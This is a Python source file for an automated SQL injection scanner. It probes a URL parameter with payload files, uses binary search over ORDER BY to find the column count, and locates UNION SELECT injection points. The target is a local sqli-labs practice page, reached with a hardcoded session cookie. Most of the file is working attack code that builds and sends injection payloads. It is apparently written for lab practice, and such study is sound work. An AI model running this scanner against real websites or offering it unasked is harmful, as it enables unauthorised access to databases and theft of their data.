# -*- coding: UTF-8 -*-
from difflib import SequenceMatcher
import requests
import sys
from urllib import parse
import re
import aiohttp

class sqlScan():

	def __init__(self,url,method = 1):
		self.url = url
		self.field_count = 0
		self.ifInjection = False
		self.headers =  {
		'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
		'Accept-Language': 'Zh-CN, zh;q=0.8, en-gb;q=0.8, en-us;q=0.8',
		'Accept-Encoding': 'identity',
		'Keep-Alive': '300',
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		}
		self.method = method
		self.pre_dict = []
		self.filed_num = 50
		self.stuffix = ["#","-- "]
		self.size = 10
		self.cookie = {"PHPSESSID":"l4d5vimt214shhrop6etsr22k4","security":"low"}


	def get_ratio(self,payload,res_text):
		seqm = SequenceMatcher()
		text = self.get_page(payload)
		seqm.set_seq1(text)
		seqm.set_seq2(res_text)
		return seqm.ratio()

	def str_in_queue(self):

		with open('directroy/pathtotest_huge.txt','rb') as f:
			while True:
				string = f.readline().decode('utf-8').strip()
				if string:
					self.queue1.put_nowait(string)
				else:
					break
		self.length1 = self.queue1.qsize()

	def get_page(self,payload):
		payload = parse.quote(payload.encode("utf-8"))
		url = self.url.replace("*",payload)
		text = requests.get(url,headers = self.headers,cookies = self.cookie).content
		return text.decode("utf-8")

	def make_payload(self,payload):
		for stuffix in self.stuffix:
			for pre in self.pre_dict:
				and_position = pre.index("an")
				result = str(pre[:and_position]) + payload + stuffix + pre[and_position:]
				yield result

	def check_if_can_inject(self):
		print("[~]checking whether can be injected......")
		with open("payload1.txt","r") as f:
			for i in f:
				false_payload = i.strip("\n")
				true_payload = false_payload.replace('8','6')
				false_page = self.get_page(false_payload)
				if "You have an error in your SQL syntax" in false_page:
					continue
				ratio = self.get_ratio(true_payload,false_page)
				#print(ratio,true_payload,sep = " => ")
				if ratio <0.994:
					self.pre_dict.append(true_payload.replace("1","0"))
			print(self.pre_dict)
			if self.pre_dict:
				print("[*]it can be injected")
				return True
			else:
				print("[-]it can't be injected")
				return False					

	def padding(self,str_):
		return str_ + "*" * (self.size-len(str_))


	def get_field_num(self):

		with open("order.txt","r") as f:
			for order in f:
				start = 0
				filed_num = 50
				temp_num = 0
				count =  100 # 避免无限循环
				#print(filed_num)
				while True:
					payload_ = order.strip("\n") + " " + str(filed_num)
					for payload in self.make_payload(payload_):
						page = self.get_page(payload)
						if "Unknown column '{}' in 'order clause".format(filed_num) in page:
							temp_num = filed_num
							filed_num = int((start + filed_num) / 2)
							break
						elif "You have an error in your SQL syntax" in page:
							count -= 1
							continue
						else:
							start = filed_num
							filed_num = int((start  + temp_num) / 2)
							count -= 1
						if start != temp_num - 1:
							break
						else:
							print("[*]order sentence is {}".format(order.strip("\n")))
							return filed_num
					if count == 0:
						break
			return False

	def union_inject(self):
		if not self.check_if_can_inject():
			sys.exit(0)
		print("[~]strat checking union injection......")
		filed_num = self.get_field_num()
		if filed_num:
			print("[*]The colune number is {}".format(filed_num))
			print("[~]strat getting inject position......")
			arr = []
			for i in range(1,filed_num+1):
				arr.append("000" + self.padding(str(i)) + "000")
			payload_ = "union select {}".format("'" + "','".join(arr) + "'")
			for payload in self.make_payload(payload_):
				page = self.get_page(payload)
				str2 = re.findall("000([0-9*]{10})000",page)
				if str2:
					print("[*]The payload is {}".format(payload))
					position_set = set()
					for position in str2:
						if not position in position_set:
							position_set.add(position)
			if position_set:
				while position_set:
					print("[*]position {} can be injected".format(position_set.pop().split("*")[0]))
			else:
				print("[-]can't union inject")
				sys.exit(0)
		else:
			print("[-]can't get field num")
			sys.exit(0)

if __name__ == '__main__':
	a = sqlScan("http://127.0.0.1/sqli-labs-master/Less-4/?id=*")
	a.union_inject()